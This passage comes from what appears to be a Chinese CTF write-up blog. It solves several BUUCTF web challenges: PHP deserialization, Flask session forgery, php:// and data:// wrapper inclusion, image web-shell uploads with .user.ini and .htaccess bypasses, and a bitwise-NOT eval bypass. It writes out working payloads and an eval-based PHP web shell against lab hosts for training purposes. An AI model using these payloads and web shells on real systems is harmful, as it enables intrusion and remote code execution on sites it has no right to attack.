punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span>\n</code></pre>\n<p>得到序列化结果</p>\n<pre><code>O:11:&quot;FileHandler&quot;:3：&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;\n</code></pre>\n<p>访问，F12查看【或者改一下filename的值为php:&#x2F;&#x2F;filter伪协议，用base64，可以直接看到】</p>\n<p><code>http://f20b2545-8ff3-4a33-887f-27f4901db96a.node4.buuoj.cn:81/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p>\n<p>得到flag</p>\n<p><img src=\"/post/wp-buuctf/image-20220822135717175.png\" alt=\"image-20220822135717175\"></p>\n<h2 id=\"7-HCTF-2018-admin\"><a href=\"#7-HCTF-2018-admin\" class=\"headerlink\" title=\"7.[HCTF 2018]admin\"></a>7.[HCTF 2018]admin</h2><h3 id=\"1-题目描述-4\"><a href=\"#1-题目描述-4\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-4\"><a href=\"#2-wp-4\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>这道题开始当作弱密码题解，结果直接爆破出来了</p>\n<p>用户名：admin</p>\n<p>密码：123</p>\n<p>这样应该最简单的方法了</p>\n<p>但我看了看其他大佬wp，他们把这个当作flask_session伪造的题目</p>\n<p>学习一下</p>\n<p>先注册一个试试</p>\n<p>用户名：admin123</p>\n<p>密码：123456</p>\n<p><img src=\"/post/wp-buuctf/image-20220822203857056.png\" alt=\"image-20220822203857056\"></p>\n<p>只在<code>change password</code>的源码看到线索，知道是flask框架</p>\n<p><img src=\"/post/wp-buuctf/image-20220822203848108.png\" alt=\"image-20220822203848108\"></p>\n<p>访问下载文件</p>\n<p>flask存在一个session伪造漏洞</p>\n<pre><code>flask的session保存在客户端，一般只是加了签名来防止被截取修改，但是如果没有加密我们就可以对session进行解码来获取其中的用户数据。 \n\n如果我们在获取到签名的秘钥，就可以按照解码出来的数据进行伪造，重新生成签名的session来达到欺骗服务端。  \n\nflask的session使用base64对bytes类型的用户数据进行编码，而且编码之前可能进行了压缩(session以 &quot;.&quot;  开头时表示进行了压缩) flask 保存在cookie里面的session一般格式为 data.timestamp.signature\n</code></pre>\n<p>这里的session没有加密，在config.py中得到了签名秘钥<code>ckj123</code>，于是我们就可以重新生成session，来欺骗服务器</p>\n<p><img src=\"/post/wp-buuctf/image-20220822204409898.png\" alt=\"image-20220822204409898\"></p>\n<p>利用cookie editor查看session值</p>\n<p><img src=\"/post/wp-buuctf/image-20220822231718091.png\" alt=\"image-20220822231718091\"></p>\n<p>然后再找发现index.html下有flag提示</p>\n<p><img src=\"/post/wp-buuctf/image-20220823000533344.png\" alt=\"image-20220823000533344\"></p>\n<p>简单分析一下，就是让session里的name&#x3D;&#x3D;”admin”</p>\n<p>所以这里就需要修改一下我们得到的session</p>\n<p>这里建议了解一下一个工具<code>flask-session-cookie-manager-master</code>能对其进行加密解码【可能需要pip下一些模块，百度可以解决】</p>\n<pre><code>解密\npython flask_session_cookie_manager3.py decode -s “cxk123” -c “你在change页面的session值”\n加密\npython flask_session_cookie_manager3.py encode -s “cxk123” -t “按照得到解密结果格式改的结果”\n\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20220822235758750.png\" alt=\"image-20220822235758750\"></p>\n<pre><code>&#123;&#39;_fresh&#39;: False, &#39;_id&#39;: b&#39;b83a7c28f514d37ed353fb8dd5a8febd8703c5b8b2d40b5354872c13dd4314cccf9116d2dcd65987e5f08b2d6cffdf72cb7660baeb7d5e76f3ac2465a956f03f&#39;, &#39;csrf_token&#39;: b&#39;c975b35234b704019c94accb0ff54e774dcaae68&#39;, &#39;image&#39;: b&#39;cxf4&#39;, &#39;name&#39;: &#39;admin123&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;\n\n把我们的用户名改为admin\n\n&#123;&#39;_fresh&#39;: False, &#39;_id&#39;: b&#39;b83a7c28f514d37ed353fb8dd5a8febd8703c5b8b2d40b5354872c13dd4314cccf9116d2dcd65987e5f08b2d6cffdf72cb7660baeb7d5e76f3ac2465a956f03f&#39;, &#39;csrf_token&#39;: b&#39;c975b35234b704019c94accb0ff54e774dcaae68&#39;, &#39;image&#39;: b&#39;cxf4&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;\n</code></pre>\n<p>然后再加密</p>\n<p><img src=\"/post/wp-buuctf/image-20220823000020825.png\" alt=\"image-20220823000020825\"></p>\n<p>然后cookie editor修改为我们加密结果</p>\n<pre><code>.eJxFUMtug0AM_JXK5xx4tBekHCKRIiqtEWgJ8l4iGkjAy1IJWlE2yr93m1bKwQd7xvbMXOF4ntq5g-hcD3O7gWPfQHSFp3eIgPhiSTYsuDMo956KRaiq3KJEQ9xpFR-6LFEDmfwZ7c6SPfRZkq4qzhfi0vF-528sJDpuboUsmAI0mdx_o8lXlaBGLl-yuBmwouVvV7EySis-rRSkITItZF4H4kZjVYbus6VKrBiTT1L7rl9EQFu4beA0T-fj54dux4cFq0OsUifFVZKGwkkTcuBMFp2T0otEOWvFgPbkOTkdVWWQ7bb3c72pL-3jUuhC-EfG2jgA6sb0I2zga26ne27ge3D7AeD4b34.YwOoDA.quyfjg-Miz9Y5cx6i5hTVr0EWjE\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20220823000303547.png\" alt=\"image-20220823000303547\"></p>\n<p>得到flag</p>\n<h2 id=\"8-ZJCTF-2019-NiZhuanSiWei\"><a href=\"#8-ZJCTF-2019-NiZhuanSiWei\" class=\"headerlink\" title=\"8.[ZJCTF 2019]NiZhuanSiWei\"></a>8.[ZJCTF 2019]NiZhuanSiWei</h2><h3 id=\"1-题目描述-5\"><a href=\"#1-题目描述-5\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-5\"><a href=\"#2-wp-5\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>先分析一下</p>\n<pre class=\" language-php\"><code class=\"language-php\"> <span class=\"token delimiter\">&lt;?php</span>  \n<span class=\"token variable\">$text</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"text\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"password\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$text</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$text</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token string\">\"welcome to the zjctf\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string\">\"&lt;br>&lt;h1>\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$text</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token string\">\"&lt;/h1>&lt;/br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/flag/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string\">\"Not now!\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\" spellcheck=\"true\">//useless.php</span>\n        <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span> \n</code></pre>\n<p>第一个</p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$text</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$text</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token string\">\"welcome to the zjctf\"</span><span class=\"token punctuation\">)</span><span class=\"token comment\" spellcheck=\"true\">//r为读取权限</span>\n</code></pre>\n<p>file_get_contents()函数是将文件内容读取到变量，而这里是从变量读取，读取text变量的值，这里需要text变量为<code>welcome to the zjctf</code></p>\n<p>但是因为可能存在对变量的正则匹配，过滤，一般是用base64绕过</p>\n<p>这里就可以利用两个伪协议，php:&#x2F;&#x2F;input和data:&#x2F;&#x2F;，这两个一个是读取post数据，一个是读取get数据，这里用data:&#x2F;&#x2F;协议</p>\n<pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=\n</code></pre>\n<p>当然这里不用base64也可以</p>\n<pre><code>?text=data://text/plain;welcome to the zjctf\n</code></pre>\n<p>第二个</p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\" spellcheck=\"true\">//useless.php</span>\n</code></pre>\n<p>一个文件包含，尝试用php:&#x2F;&#x2F;filter读取<code>useless.php</code></p>\n<pre><code>&amp;file=php://filter/read=conver.base64-encode/resource=useless.php\n</code></pre>\n<p>至于password，猜测应该是在useless.php里才有线索，先赋值1看看</p>\n<p>于是先构造一个payload</p>\n<pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php&amp;password=1\n</code></pre>\n<p>得到<code>useless.php</code>内容</p>\n<p><img src=\"/post/wp-buuctf/image-20220823175723137.png\" alt=\"image-20220823175723137\"></p>\n<pre class=\" language-php\"><code class=\"language-php\">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo\n\n解码后\n\n<span class=\"token delimiter\">&lt;?php</span>  \n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\" spellcheck=\"true\">//flag.php  </span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>  \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__tostring</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>  \n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>  \n            <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n            <span class=\"token keyword\">echo</span> <span class=\"token string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\"U R <span class=\"token constant\">SO</span> <span class=\"token constant\">CLOSE</span> <span class=\"token operator\">!</span><span class=\"token comment\" spellcheck=\"true\">///COME ON PLZ\");</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>  \n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>  \n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>  \n<span class=\"token delimiter\">?></span>  \n</code></pre>\n<p>再看看password变量</p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>这里用了反序列化，所以password就是序列化后的值</p>\n<p>利用<code>useless.php</code>构造序列化</p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>  \n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string\">\"flag.php\"</span> <span class=\"token punctuation\">;</span>  \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__tostring</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>  \n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>  \n            <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n            <span class=\"token keyword\">echo</span> <span class=\"token string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\"U R <span class=\"token constant\">SO</span> <span class=\"token constant\">CLOSE</span> <span class=\"token operator\">!</span><span class=\"token comment\" spellcheck=\"true\">///COME ON PLZ\");</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>  \n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>  \n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>  \n<span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span>  \n</code></pre>\n<p>运行后        </p>\n<pre><code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;  \n</code></pre>\n<p>最后payload</p>\n<pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;\n\n//仔细一下会注意到这里的file的值中，伪协议删除了，\n这是因为开始默认都是index.php，但是index.php没有Flag类，\n如果想执行反序列化，那就需要包含Flag类，也就是这里的useless.php里的\n所以这里删除file里的伪协议，只留useless.php的文件名\n就是利用  include($file); \n把useless.php包含在index.php里，从而可以成功执行反序列化，得到flag\n</code></pre>\n<p>得到flag</p>\n<h2 id=\"9-SUCTF-2019-CheckIn\"><a href=\"#9-SUCTF-2019-CheckIn\" class=\"headerlink\" title=\"9.[SUCTF 2019]CheckIn\"></a>9.[SUCTF 2019]CheckIn</h2><h3 id=\"1-题目描述-6\"><a href=\"#1-题目描述-6\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-6\"><a href=\"#2-wp-6\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>先上传一个文本文件试试</p>\n<p><img src=\"/post/wp-buuctf/image-20220825173012665.png\" alt=\"image-20220825173012665\"></p>\n<pre><code>exif_imagetype是判断一个图像的类型的进程。\n</code></pre>\n<p>所以只能上传图片</p>\n<p>先上传一个包含PHP木马的图片马试试</p>\n<p><img src=\"/post/wp-buuctf/image-20220825174837632.png\" alt=\"image-20220825174837632\"></p>\n<p>看来是过滤了<code>&lt;?</code>，所以除了php,其他的asp,aspx,jsp,js都可以绕过</p>\n<p>这里以js举例</p>\n<p>创建一个js文件，内容为</p>\n<pre class=\" language-js\"><code class=\"language-js\"><span class=\"token operator\">&lt;</span>script language<span class=\"token operator\">=</span><span class=\"token string\">\"php\"</span><span class=\"token operator\">></span>@<span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span>\n</code></pre>\n<p>在和一个普通图片合成，也可以加个文件头GIF89a</p>\n<p>图片马名为<code>haha.gif</code></p>\n<p>然后上传</p>\n<p><img src=\"/post/wp-buuctf/image-20220825210858681.png\" alt=\"image-20220825210858681\"></p>\n<p>由于不是php木马，所以无法用<code>.htaccess</code>文件绕过</p>\n<p>这里就需要用<code>.user.ini</code>配置文件,当然使用前提是<code>.user.ini</code>文件下有php文件，不然也不能包含了</p>\n<p>推荐看一下这篇<a href=\"https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html\">文章</a></p>\n<p><strong>在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。</strong></p>\n<p> <strong>这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。</strong></p>\n<p> <strong>其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。</strong></p>\n<pre><code>auto_append_file、auto_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 \n\n使用方法很简单，直接写在.user.ini中：\n</code></pre>\n<p>所以这里设置自动包含的文件为<code>haha.gif</code></p>\n<p>于是<code>.user.ini</code>内容为</p>\n<pre><code>GIF89a       //绕过图片判断         \nauto_prepend_file=haha.gif\n</code></pre>\n<p>上传<code>.user.ini</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220825214029074.png\" alt=\"image-20220825214029074\"></p>\n<p>这个时候haha.gif就已经包含在index.php，可以访问</p>\n<pre><code>http://9c7a4b64-1c49-4ee4-a146-dc6763b5ce1c.node4.buuoj.cn:81/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php\n</code></pre>\n<p>能看到<code>GIF98a?</code></p>\n<p>然后也可以用hackbar，post上传命令，如图中的phpinfo()</p>\n<p><img src=\"/post/wp-buuctf/image-20220825215617387.png\" alt=\"image-20220825215617387\"></p>\n<pre><code>cmd=var_dump(scandir(&quot;/&quot;));//看看根目录，找到flag\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20220825220933577.png\" alt=\"image-20220825220933577\"></p>\n<pre><code>cmd=var_dump(file_get_contents(&quot;/flag&quot;));//读取flag文件\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20220825221229971.png\" alt=\"image-20220825221229971\"></p>\n<hr>\n<p>当然用蚁剑最简单，连接也成功</p>\n<p><img src=\"/post/wp-buuctf/image-20220825214728996.png\" alt=\"image-20220825214728996\"></p>\n<p>可以看到<strong>index.php文件也在上传的目录</strong>下，也就是<code>.user.ini</code>的同一个目录下，所以才可以成功包含</p>\n<p><img src=\"/post/wp-buuctf/image-20220825215454619.png\" alt=\"image-20220825215454619\"></p>\n<p>在根目录发现了flag，打开即可得到flag</p>\n<hr>\n<p>但我发现根目录一个clean.sh文件，这是一个定时清空linux服务器上缓存的文件脚本，上传的文件会被定时删除</p>\n<p><img src=\"/post/wp-buuctf/image-20220825215047906.png\" alt=\"image-20220825215047906\"></p>\n<p>这是一分钟左右后，靶场环境还在但是无法访问了，所以要快点拿取flag</p>\n<p><img src=\"/post/wp-buuctf/image-20220825215220524.png\" alt=\"image-20220825215220524\"></p>\n<p>这里本来想删掉clean.sh，发现没权限，无法执行，sudo也不行，那就只能速战速决了</p>\n<p><img src=\"/post/wp-buuctf/image-20220825220024393.png\" alt=\"image-20220825220024393\"></p>\n<p>根目录得到flag</p>\n<h2 id=\"10-GXYCTF2019-BabyUpload\"><a href=\"#10-GXYCTF2019-BabyUpload\" class=\"headerlink\" title=\"10.[GXYCTF2019]BabyUpload\"></a>10.[GXYCTF2019]BabyUpload</h2><h3 id=\"1-题目描述-7\"><a href=\"#1-题目描述-7\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-7\"><a href=\"#2-wp-7\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>这道题不难，但是开始不清楚还是不知道过滤了什么，</p>\n<p>这道题介绍几个点就可以了</p>\n<p>第一个是过滤了后缀名含ph</p>\n<p>第二也是关键的，它只允许上传<code>content-type: image/jpeg</code>，png和gif都不可以</p>\n<p>第三点就是它过滤了文件内容里含<code>&lt;?</code></p>\n<p>所以上传一个jpeg文件，抓包修改内容为非php但包含php的一个脚本，</p>\n<pre class=\" language-jsp\"><code class=\"language-jsp\"><script language=\"php\">@eval($_POST[\"cmd\"]);</script>\n</code></pre>\n<p>再上传.htaccess文件，解析所有文件为php</p>\n<p>用蚁剑连接jpeg文件，即可</p>\n<h2 id=\"11-极客大挑战-2019-RCE-ME\"><a href=\"#11-极客大挑战-2019-RCE-ME\" class=\"headerlink\" title=\"11.[极客大挑战 2019]RCE ME\"></a>11.[极客大挑战 2019]RCE ME</h2><h3 id=\"1-题目描述-8\"><a href=\"#1-题目描述-8\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-8\"><a href=\"#2-wp-8\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>先对代码分析</p>\n<pre class=\" language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n                                        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"This is too Long.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                                                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/[A-Za-z0-9]+/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n                                        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"NO.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                                                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n                    @<span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\" spellcheck=\"true\">// ?></span>\n</code></pre>\n<p>可以看到code被正则匹配，所以字母大小写和数字都不能输入</p>\n<p>这里就学到新东西了</p>\n<p><strong>取反绕过</strong></p>\n<p><u><strong>取反</strong>就是将数字转化为二进制,再把二进制中的1变成0,0变成1</u></p>\n<p><code>~</code>是取反符号，</p>\n<pre><code>&lt;?php\necho urlencode(~&#39;assert&#39;);\necho urlencode(~&#39;eval($_REQUEST[8])&#39;);\n?&gt;\n\n结果：\n%9E%8C%8C%9A%8D%8B\n%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6\n\n//php断言：assert — 检查一个断言是否为 false，如果参数是字符串，它将会被 assert() 当做 PHP 